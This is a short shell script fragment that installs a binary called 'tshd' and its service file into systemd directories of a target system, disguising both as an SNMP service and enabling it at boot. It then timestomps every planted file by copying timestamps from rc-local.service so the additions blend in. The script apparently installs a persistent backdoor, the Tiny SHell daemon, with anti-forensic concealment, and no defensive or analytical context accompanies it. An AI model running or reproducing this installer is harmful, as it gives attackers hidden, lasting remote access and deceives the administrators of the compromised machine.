cp tsh.service $1/etc/systemd/system/multi-user.target.wants/snmp.service
cp tsh.service $1/etc/systemd/system/snmp.service
cp tsh.service $1/lib/systemd/system/snmp.service

chmod +x tshd
cp tshd $1/usr/bin/snmp

touch -amcr $1/lib/systemd/system/rc-local.service $1/etc/systemd/system/multi-user.target.wants/snmp.service
touch -amcr $1/lib/systemd/system/rc-local.service $1/etc/systemd/system/snmp.service
touch -amcr $1/lib/systemd/system/rc-local.service $1/lib/systemd/system/snmp.service
touch -amcr $1/lib/systemd/system/rc-local.service $1/usr/bin/snmp
